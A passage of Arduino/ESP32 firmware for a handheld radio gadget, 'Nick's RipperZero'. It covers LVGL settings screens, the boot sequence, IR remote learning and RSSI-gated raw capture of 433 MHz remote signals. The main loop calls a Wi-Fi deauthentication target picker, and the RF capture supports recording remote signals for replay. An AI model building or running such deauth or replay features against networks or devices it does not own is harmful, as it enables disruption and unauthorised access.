                "12 / 24 HOUR", COLOR_RF, clock_toggle_format);
  create_button(clock_settings_screen, 166, 302, 136, 40,
                "SAVE CLOCK", COLOR_GREEN, clock_save);
  create_button(clock_settings_screen, 70, 365, 180, 38,
                "BACK TO SETTINGS", COLOR_SETTINGS, open_settings);
  create_footer(clock_settings_screen);
  refresh_clock_edit_screen();
}


void create_wifi_credentials_screen() {
  wifi_credentials_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(wifi_credentials_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(wifi_credentials_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(wifi_credentials_screen, false);
  create_header(wifi_credentials_screen, "WI-FI CREDENTIALS");

  lv_obj_t *note = lv_label_create(wifi_credentials_screen);
  lv_label_set_text(note, "OWNER NETWORK SETTINGS");
  lv_obj_set_width(note, 292);
  lv_obj_set_style_text_align(note, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(note, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(note, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(note, 14, 92);

  lv_obj_t *status_panel = lv_obj_create(wifi_credentials_screen);
  lv_obj_set_size(status_panel, 294, 126);
  lv_obj_set_pos(status_panel, 13, 116);
  lv_obj_set_style_bg_color(status_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(status_panel, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_border_width(status_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(status_panel, 12, LV_PART_MAIN);
  lv_obj_clear_flag(status_panel, LV_OBJ_FLAG_SCROLLABLE);

  wifi_credentials_status_label = lv_label_create(status_panel);
  lv_obj_set_width(wifi_credentials_status_label, 264);
  lv_obj_set_style_text_align(wifi_credentials_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_set_style_text_color(wifi_credentials_status_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(wifi_credentials_status_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_center(wifi_credentials_status_label);

  create_button(wifi_credentials_screen, 24, 260, 272, 40,
                "RECONNECT SAVED NETWORK", COLOR_GREEN, reconnect_saved_wifi);
  create_button(wifi_credentials_screen, 24, 310, 272, 40,
                "OPEN SETUP PORTAL", COLOR_SETTINGS, open_saved_wifi_setup_portal);
  create_button(wifi_credentials_screen, 24, 360, 272, 40,
                "FORGET SAVED NETWORK", COLOR_RED, forget_saved_wifi);
  create_button(wifi_credentials_screen, 70, 408, 180, 28,
                "<  SETTINGS", COLOR_SETTINGS, open_settings);
  refresh_wifi_credentials_screen();
}


void create_settings_screen() {
  settings_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(settings_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(settings_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(settings_screen, false);
  create_header(settings_screen, "SYSTEM SETTINGS");

  lv_obj_t *hardware_status_panel = lv_obj_create(settings_screen);
  lv_obj_set_size(hardware_status_panel, 296, 80);
  // Clear the header's global status/battery row before the settings content.
  lv_obj_align(hardware_status_panel, LV_ALIGN_TOP_MID, 0, 92);
  lv_obj_set_style_bg_color(hardware_status_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(hardware_status_panel, LV_OPA_90, LV_PART_MAIN);
  lv_obj_set_style_border_color(hardware_status_panel, lv_color_hex(COLOR_BORDER), LV_PART_MAIN);
  lv_obj_set_style_border_width(hardware_status_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(hardware_status_panel, 12, LV_PART_MAIN);
  lv_obj_clear_flag(hardware_status_panel, LV_OBJ_FLAG_SCROLLABLE);

  lv_obj_t *health_title = lv_label_create(hardware_status_panel);
  lv_label_set_text(health_title, "SYSTEM HEALTH");
  lv_obj_set_style_text_color(health_title, lv_color_hex(COLOR_SETTINGS), LV_PART_MAIN);
  lv_obj_set_style_text_font(health_title, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(health_title, 12, 7);

  hardware_status_label = lv_label_create(hardware_status_panel);
  lv_obj_set_style_text_color(hardware_status_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(hardware_status_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_line_space(hardware_status_label, 2, LV_PART_MAIN);
  lv_obj_set_width(hardware_status_label, 252);
  lv_obj_align(hardware_status_label, LV_ALIGN_TOP_LEFT, 30, 25);

  const lv_coord_t hardware_dot_y[HARDWARE_STATUS_DOT_COUNT] = {31, 49, 67};
  for (uint8_t i = 0; i < HARDWARE_STATUS_DOT_COUNT; ++i) {
    hardware_status_dots[i] = lv_obj_create(hardware_status_panel);
    lv_obj_set_size(hardware_status_dots[i], 8, 8);
    lv_obj_set_style_radius(hardware_status_dots[i], LV_RADIUS_CIRCLE, LV_PART_MAIN);
    lv_obj_set_style_bg_opa(hardware_status_dots[i], LV_OPA_COVER, LV_PART_MAIN);
    lv_obj_set_style_border_width(hardware_status_dots[i], 0, LV_PART_MAIN);
    lv_obj_align(hardware_status_dots[i], LV_ALIGN_TOP_LEFT, 13, hardware_dot_y[i]);
  }

  lv_obj_t *settings_kicker = lv_label_create(settings_screen);
  lv_label_set_text(settings_kicker, "DEVICE & INTERFACE");
  lv_obj_set_style_text_color(settings_kicker, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(settings_kicker, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_pos(settings_kicker, 14, 180);

  create_dashboard_tile(settings_screen, 12, 198, 144, 62,
                        LV_SYMBOL_EYE_OPEN, "BRIGHTNESS", "DISPLAY LEVEL", COLOR_SETTINGS, open_brightness_settings);
  create_dashboard_tile(settings_screen, 164, 198, 144, 62,
                        "CLOCK_FACE", "CLOCK", "TIME & FORMAT", COLOR_SETTINGS, open_clock_settings);
  create_dashboard_tile(settings_screen, 12, 268, 144, 62,
                        LV_SYMBOL_IMAGE, "QR MAKER", "CREATE A CODE", COLOR_QR, open_qr_generator);
  create_dashboard_tile(settings_screen, 164, 268, 144, 62,
                        LV_SYMBOL_WIFI, "WI-FI", "SAVED NETWORK", COLOR_GREEN, open_wifi_credentials_settings);
  create_dashboard_tile(settings_screen, 12, 338, 296, 58,
                        LV_SYMBOL_GPS, "RADIO HARDWARE", "RETRY CC1101 CONNECTION", COLOR_RF, retry_cc1101_probe);
  create_button(settings_screen, 18, 400, 136, 30, "<  HOME", COLOR_SETTINGS, go_home);
  create_button(settings_screen, 166, 400, 136, 30, LV_SYMBOL_POWER, COLOR_RED, turn_off_device);
  create_footer(settings_screen);
  refresh_hardware_status();
}

void setup() {

  Serial.begin(
    115200
  );

  // Give a just-opened USB serial monitor time to attach after reset.  This is
  // especially useful while diagnosing startup problems on the S3 board.
  delay(2200);

  Serial.println();
  Serial.println(
    "Starting Nick's RipperZero..."
  );

  // A queued IR send only ever belongs to the current button tap, never to a
  // previous session or partially-restored UI state.
  ir_pending_send_index = -1;
  ir_pending_send_requested = false;

  // Recovery-only boot path: do not read NVS until the display has been
  // verified.  Nothing is erased; saved remotes and settings remain intact.
  const bool safe_boot_diagnostic = true;
  if (!safe_boot_diagnostic) {
    load_saved_remotes();
    load_learned_ir_commands();
    load_saved_ir_remotes();
    load_saved_remote_layouts();
    load_saved_rf_raw_commands();
    load_rf_profile_preference();
    load_display_clock_preferences();
  } else {
    Serial.println("SAFE BOOT: saved data not loaded");
  }


  // START I2C

  Wire.begin(
    I2C_SDA,
    I2C_SCL
  );

#if RIPPER_RECOVERY_ENABLE_AUDIO
  board_audio_ready = initialize_board_speaker();
  Serial.println(board_audio_ready ? "ES8311 speaker initialized" : "ES8311 speaker not available");
#endif
#if !RIPPER_SAFE_HOME_RECOVERY || RIPPER_RECOVERY_ENABLE_CLOCK
  rtc_ready = rtc.begin(Wire, I2C_SDA, I2C_SCL);
  Serial.println(rtc_ready ? "PCF85063 clock initialized" : "PCF85063 clock not found");
#endif
#if !RIPPER_SAFE_HOME_RECOVERY || RIPPER_RECOVERY_ENABLE_BATTERY
  initialize_battery_monitor();
  auto_shutdown_last_activity_ms = millis();
#endif


  // START TCA9554

  TCA.begin();

  TCA.pinMode1(
    1,
    OUTPUT
  );

  lcd_reset();


  // START TOUCH

  if (
    !touch.begin(
      Wire,
      FT6X36_SLAVE_ADDRESS
    )
  ) {

    Serial.println(
      "Failed to find FT6X36 - check wiring!"
    );

    while (1) {
      delay(1000);
    }
  }


  Serial.println(
    "Touch initialized"
  );


  // START DISPLAY

  if (!gfx->begin()) {

    Serial.println(
      "gfx->begin() failed!"
    );

  } else {

    Serial.println(
      "Display initialized"
    );
  }


  gfx->fillScreen(
    RGB565_BLACK
  );


  // BACKLIGHT

  if (!ledcAttach(GFX_BL, 12000, 8)) {
    Serial.println("Backlight PWM initialization failed");
  }
  apply_display_brightness(display_brightness);

  // SD is optional; a missing or unformatted card must not block the UI.
  // Detection is read-only with respect to card contents (no formatting).
  sd_card_ready = initialize_sd_card();

#if RIPPER_DISPLAY_RECOVERY_TEST
  gfx->fillScreen(RGB565_BLUE);
  gfx->setTextColor(RGB565_WHITE);
  gfx->setTextSize(2);
  gfx->setCursor(30, 80);
  gfx->println("DISPLAY OK");
  gfx->setCursor(30, 115);
  gfx->println("LCD TEST");
  Serial.println("DISPLAY RECOVERY TEST ACTIVE");
  return;
#endif


  // START CC1101 ON ITS DEDICATED SPI BUS
#if !RIPPER_SAFE_HOME_RECOVERY

  cc1101_ready = initialize_cc1101();

  if (!cc1101_ready) {
    Serial.println("CC1101 unavailable; RF discovery transmission is disabled.");
  }

  e01_ready = initialize_e01_radio();

  // IR receiver signal is on the free J8-20 / GPIO41 connection.  This is
  // input-only and does not affect the display or CC1101 wiring.
  initialize_ir_receiver();
  initialize_ir_transmitter();

  // Reserve the BLE controller before LVGL builds the rest of the interface.
  // Starting it later can fail simply because internal RAM has become
  // fragmented, even though enough total memory exists.
  if (ensure_ble_stack()) {
    Serial.println("BLE radio reserved for discovery and pairing");
  } else {
    Serial.println("BLE radio could not reserve memory at startup");
  }
#else
  Serial.println("SAFE RECOVERY: RF, IR, and BLE services held");
#endif

  // START LVGL

  lv_init();


  screenWidth =
    gfx->width();

  screenHeight =
    gfx->height();


  // The recovery screen uses the already-verified compact, single-buffer
  // configuration.  The normal application restores the faster dual-buffer
  // path only after the full screen is visibly stable again.
  bufSize = screenWidth * (RIPPER_COMPACT_DRAW_BUFFER ? 50 : 120);


  // The Waveshare configuration includes 8 MB of OPI PSRAM.  Keep the two
  // large frame buffers there so the Wi-Fi and BLE radio stacks retain the
  // contiguous *internal* RAM they require for scans and connections.
  const uint32_t display_buffer_caps = psramFound()
    ? (MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT)
    : (MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
  Serial.printf("LVGL draw buffers: %s\n", psramFound() ? "PSRAM" : "internal RAM");

  disp_draw_buf1 =
    (lv_color_t *)heap_caps_malloc(
      bufSize * sizeof(lv_color_t),
      display_buffer_caps
    );


  disp_draw_buf2 = RIPPER_COMPACT_DRAW_BUFFER ? NULL :
    (lv_color_t *)heap_caps_malloc(
      bufSize * sizeof(lv_color_t),
      display_buffer_caps
    );


  if (
    !disp_draw_buf1 ||
    (!RIPPER_COMPACT_DRAW_BUFFER && !disp_draw_buf2)
  ) {

    Serial.println(
      "ERROR: LVGL buffer allocation failed!"
    );

    while (1) {
      delay(1000);
    }
  }


  lv_disp_draw_buf_init(
    &draw_buf,
    disp_draw_buf1,
    disp_draw_buf2,
    bufSize
  );


  // REGISTER DISPLAY

  lv_disp_drv_init(
    &disp_drv
  );


  disp_drv.hor_res =
    screenWidth;

  disp_drv.ver_res =
    screenHeight;

  disp_drv.flush_cb =
    my_disp_flush;

  disp_drv.draw_buf =
    &draw_buf;


  lv_disp_drv_register(
    &disp_drv
  );


  // REGISTER TOUCH

  static lv_indev_drv_t indev_drv;


  lv_indev_drv_init(
    &indev_drv
  );


  indev_drv.type =
    LV_INDEV_TYPE_POINTER;

  indev_drv.read_cb =
    my_touchpad_read;


  lv_indev_drv_register(
    &indev_drv
  );


  // ==========================================================
  // CREATE ALL SCREENS
  // ==========================================================

  // The compact draw buffer is now verified. Restore the real home builder
  // while keeping optional services held for the next isolation step.
  create_home_screen();

  // Recovery-stage boot: build the actual home UI first.  The remaining
  // screens are opened lazily after the baseline is visibly stable.
#if 1
  create_rf_screen();

  create_rf_discovery_screen();

  create_dip_fan_discovery_screen();

  create_universal_screen();

  universal_remote_screen =
    lv_obj_create(NULL);

  lv_obj_set_style_bg_color(
    universal_remote_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );

  lv_obj_set_style_bg_opa(
    universal_remote_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(universal_remote_screen, true);

  create_universal_capture_screen();

  create_known_screen();

  create_device_type_screen();

  create_known_capture_screen();


  // OTHER MAIN MENU SCREENS

  create_ir_screen();
  // The IR learning pages are created only when opened. This preserves heap
  // headroom for the display and avoids allocating several full UI trees at boot.


  create_saved_screen();

  create_universal_name_screen();


  create_wifi_screen();


  create_ble_screen();


  create_bluetooth_screen();


  create_settings_screen();


  // The working RF remote is rebuilt by every entry path that opens it.
  // Avoid formatting an unused empty screen during boot; this also keeps the
  // startup path smaller and prevents a bad transient label pointer from
  // trapping the device in a reboot loop before the home screen appears.
#endif


  // LOAD HOME SCREEN

  lv_scr_load(
    home_screen
  );

  Serial.println(
    "Nick's RipperZero ready!"
  );
#if !RIPPER_SAFE_HOME_RECOVERY
  set_status(
    "SYSTEM READY",
    COLOR_READY
  );
  play_board_tone(880, 70);
#endif
  Serial.println("TV Blast UI: visual launch + live center code");
}


// ============================================================
// MAIN LOOP
// ============================================================

void loop() {

#if RIPPER_DISPLAY_RECOVERY_TEST
  delay(50);
  return;
#endif

  // The recovery build deliberately creates only the lightweight home page.
  // Do not run the normal service loop yet: it refreshes screens that are
  // intentionally absent during this display-isolation stage.
#if RIPPER_SAFE_HOME_RECOVERY
  lv_timer_handler();
  delay(5);
  return;
#endif

  // AXP2101 shutdown cuts the board's power rails, unlike merely turning off
  // the backlight. Plugging in USB intentionally keeps the device awake and
  // restarts the idle period for the next battery-powered session.
  if (battery_monitor_ready) {
    if (battery_pmu.isVbusIn()) {
      auto_shutdown_last_activity_ms = millis();
    } else if ((uint32_t)(millis() - auto_shutdown_last_activity_ms) >=
               AUTO_SHUTDOWN_IDLE_MS) {
      Serial.println("Auto shutdown: 10 minutes without touch input");
      apply_display_brightness(0);
      gfx->fillScreen(RGB565_BLACK);
      Serial.flush();
      delay(100);
      battery_pmu.shutdown();
      delay(500);
      // Normally the PMU has removed power before this point. Deep sleep is a
      // low-drain fallback if external board wiring keeps the SoC rail alive.
      esp_deep_sleep_start();
    }
  }

  if ((uint32_t)(millis() - battery_last_read_ms) >= 5000) {
    battery_last_read_ms = millis();
    read_battery_level();
  }

  if ((uint32_t)(millis() - clock_last_refresh_ms) >= 1000) {
    clock_last_refresh_ms = millis();
    refresh_home_clock();
    refresh_header_clocks();
  }

  if (bluetooth_last_connected != bluetooth_connected) {
    bluetooth_last_connected = bluetooth_connected;
    refresh_bluetooth_screen();
  }

  // Apply BLE navigation only from the main LVGL task. The command channel
  // intentionally cannot transmit a learned IR or RF command.
  const uint8_t phone_command = phone_control_pending_command;
  if (phone_command != 0) {
    phone_control_pending_command = 0;
    if (phone_command == 1 && home_screen != NULL) {
      lv_scr_load(home_screen);
    } else if (phone_command == 2 && rf_screen != NULL) {
      lv_scr_load(rf_screen);
    } else if (phone_command == 3 && ir_screen != NULL) {
      lv_scr_load(ir_screen);
    }
    set_status("PHONE CONTROL", COLOR_BLUETOOTH);
    Serial.printf("Phone BLE control command applied: %u\n", phone_command);
  }

  const bool wifi_link_connected = WiFi.status() == WL_CONNECTED;
  const bool ble_link_paired = ble_stack_initialized && NimBLEDevice::getNumBonds() > 0;
  if (wifi_link_last_connected != wifi_link_connected ||
      ble_link_last_connected != bluetooth_connected ||
      ble_link_last_paired != ble_link_paired) {
    wifi_link_last_connected = wifi_link_connected;
    ble_link_last_connected = bluetooth_connected;
    ble_link_last_paired = ble_link_paired;
    refresh_connection_indicators();
    refresh_bluetooth_screen();
  }

  finish_nearby_wifi_scan();
  service_wifi_live_monitor();
  service_wifi_tools();
  service_wifi_custom_ssids();
  service_wifi_deauth_target_picker();

  // Only saved IR Volume Up/Down buttons opt into press-and-hold repeats.
  service_ir_volume_hold();

  if (transmitting_status_until_ms != 0 &&
      (int32_t)(millis() - transmitting_status_until_ms) >= 0) {
    transmitting_status_until_ms = 0;
    set_status("SYSTEM READY", COLOR_READY);
  }

  update_rf_scope();
  update_live_rf_scanner();

  if (ir_receiver_ready && IrReceiver.decode()) {
    if (ir_receiver_test_active) {
      IrReceiver.printIRResultShort(&Serial);
      IrReceiver.printIRSendUsage(&Serial);

      if (ir_remote_learn_active &&
          IrReceiver.decodedIRData.protocol == UNKNOWN) {
        const bool stored = store_unknown_ir_analysis();
        lv_obj_t *unknown_ir_label = ir_guided_copy_active ?
          ir_guided_instruction_label : ir_learn_state_label;
        if (unknown_ir_label != NULL) {
          lv_label_set_text(
            unknown_ir_label,
            stored ?
              "UNKNOWN IR FORMAT\nANALYSIS SAVED - TRY AGAIN OR SKIP" :
              "UNKNOWN IR FORMAT\nCAPTURE COULD NOT BE SAVED"
          );
        }
        set_status(stored ? "UNKNOWN IR ANALYSIS SAVED" : "IR ANALYSIS SAVE FAILED",
                   stored ? COLOR_SAVED : COLOR_RED);
      } else if (ir_remote_learn_active &&
          IrReceiver.decodedIRData.protocol != UNKNOWN) {
        uint8_t button_index = ir_working_remote.button_count;
        SavedIrRemoteCommand &stored = ir_working_remote.buttons[button_index];
        memset(&stored, 0, sizeof(stored));
        stored.valid = 1;
        stored.protocol = (uint16_t)IrReceiver.decodedIRData.protocol;
        stored.address = IrReceiver.decodedIRData.address;
        stored.command = IrReceiver.decodedIRData.command;
        stored.extra = IrReceiver.decodedIRData.extra;
        stored.bits = IrReceiver.decodedIRData.numberOfBits;
        stored.flags = IrReceiver.decodedIRData.flags & ~IRDATA_FLAGS_IS_REPEAT;
        stored.raw_data = (uint64_t)IrReceiver.decodedIRData.decodedRawData;
        const char *button_name = ir_guided_copy_active ?
          ir_guided_steps[ir_guided_step_index] :
          ir_button_label_choices[ir_next_button_label_index];
        strncpy(ir_working_remote.button_names[button_index],
                button_name,
                sizeof(ir_working_remote.button_names[button_index]) - 1);
        ir_working_remote.button_names[button_index][sizeof(ir_working_remote.button_names[button_index]) - 1] = '\0';
        ir_working_remote.button_count++;

        ir_receiver_test_active = false;
        ir_remote_learn_active = false;
        bool needs_custom_button_name = !ir_guided_copy_active &&
          ir_next_button_label_index == (IR_BUTTON_LABEL_CHOICE_COUNT - 1);
        if (needs_custom_button_name) {
          ir_pending_custom_button_index = button_index;
          if (ir_custom_button_name_screen == NULL) create_ir_custom_button_name_screen();
          lv_textarea_set_text(ir_custom_button_name_textarea, "");
          lv_scr_load(ir_custom_button_name_screen);
        } else if (ir_guided_copy_active) {
          ir_guided_step_index++;
          refresh_ir_guided_copy_screen();
          lv_scr_load(ir_guided_copy_screen);
        } else {
          refresh_ir_remote_builder();
          lv_scr_load(ir_remote_builder_screen);
        }
        set_status("SYSTEM READY", COLOR_READY);
        Serial.printf("IR remote button saved: %s (protocol %u)\n",
                      ir_working_remote.button_names[button_index], stored.protocol);
      } else if (ir_power_learn_active &&
          IrReceiver.decodedIRData.protocol != UNKNOWN) {
        learned_ir_power.valid = 1;
        learned_ir_power.protocol = (uint16_t)IrReceiver.decodedIRData.protocol;
        learned_ir_power.address = IrReceiver.decodedIRData.address;
        learned_ir_power.command = IrReceiver.decodedIRData.command;
        learned_ir_power.bits = IrReceiver.decodedIRData.numberOfBits;
        learned_ir_power.raw_data = (uint64_t)IrReceiver.decodedIRData.decodedRawData;
        persist_learned_ir_power();

        ir_receiver_test_active = false;
        ir_power_learn_active = false;
        ir_receiver_test_result = 2;
        refresh_ir_blast_screen();
        set_status("SYSTEM READY", COLOR_READY);
        Serial.println("IR TV Power command saved");
      } else if (!ir_power_learn_active) {
        ir_receiver_test_result = 1;
      }
    }
    IrReceiver.resume();
  }

  if (ir_receiver_test_active &&
      (uint32_t)(millis() - ir_receiver_test_started_ms) >= 5000) {
    bool remote_learning_timed_out = ir_remote_learn_active;
    ir_receiver_test_active = false;
    ir_power_learn_active = false;
    ir_remote_learn_active = false;
    if (ir_receiver_test_result != 1) ir_receiver_test_result = 0;
    if (remote_learning_timed_out) {
      if (ir_guided_copy_active) {
        refresh_ir_guided_copy_screen();
        lv_scr_load(ir_guided_copy_screen);
      } else {
        refresh_ir_remote_builder();
        lv_scr_load(ir_remote_builder_screen);
      }
      Serial.println("IR remote learn timed out: no decodable signal");
    } else {
      refresh_ir_blast_screen();
    }
    set_status("SYSTEM READY", COLOR_READY);
    if (!remote_learning_timed_out) {
      Serial.println(
        ir_receiver_test_result == 1 ?
          "IR receiver test finished: signal detected" :
          "IR receiver test finished: no decodable signal"
      );
    }
  }

#if CC1101_ACCESS_ENABLED
  if (rf_capture_active && cc1101_ready) {
    const float rssi = cc1101.getRSSI();

    // Establish the local noise floor while the user has not yet pressed a
    // remote button. This prevents nearby 433 MHz activity from filling the
    // raw buffer before the intended signal arrives.
    if (!rf_capture_baseline_ready) {
      rf_capture_baseline_sum += rssi;
      rf_capture_baseline_samples++;
      if ((uint32_t)(millis() - rf_capture_armed_ms) >= RF_CAPTURE_BASELINE_MS &&
          rf_capture_baseline_samples > 0) {
        rf_capture_baseline_rssi = rf_capture_baseline_sum / rf_capture_baseline_samples;
        rf_capture_baseline_ready = true;
        rf_capture_peak_rssi = -140.0f;
        Serial.printf("RF capture idle baseline: %.1f dBm; ready for button\n",
                      rf_capture_baseline_rssi);
      }
    } else if (rssi > rf_capture_peak_rssi) {
      rf_capture_peak_rssi = rssi;
    }

    const bool rssi_rise = rf_capture_baseline_ready &&
      rssi >= RF_CAPTURE_MIN_VALID_RSSI_DBM &&
      rssi >= rf_capture_baseline_rssi + RF_CAPTURE_MIN_RSSI_RISE_DB;
    if (rf_rmt_ready && !rf_rmt_capture_started && rssi_rise) {
      rf_capture_carrier_seen = true;
      rf_rmt_symbol_count = RMT_SYMBOLS_OF(rf_rmt_symbols);
      if (rmtReadAsync(CC1101_GDO0, rf_rmt_symbols, &rf_rmt_symbol_count)) {
        rf_rmt_capture_started = true;
        Serial.printf("RF button signal detected (%.1f dBm over %.1f dBm baseline); recording frame\n",
                      rssi, rf_capture_baseline_rssi);
      } else {
        Serial.println("RMT capture start failed after validated RF signal");
      }
    }
  }
  if (rf_capture_active && rf_rmt_ready && rf_rmt_capture_started &&
      rmtReceiveCompleted(CC1101_GDO0)) {
    finish_universal_capture(NULL);
  }
#endif

  lv_timer_handler();

  delay(5);
}
